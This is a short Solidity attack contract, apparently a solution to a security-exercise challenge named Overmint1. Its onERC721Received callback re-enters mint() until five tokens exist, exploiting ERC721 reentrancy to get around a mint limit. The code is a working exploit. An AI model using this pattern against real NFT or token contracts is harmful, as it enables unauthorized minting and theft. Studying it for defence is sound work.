// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../Overmint1.sol";

contract AttackContract is IERC721Receiver {
    Overmint1 public target;

    constructor(address _target) {
        target = Overmint1(_target);
    }

    function exploit() external {
        // Mint initial token to trigger ERC721Receiver
        target.mint();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        // Recursively mint if total supply is less than 5
        if (target.totalSupply() < 5) {
            target.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}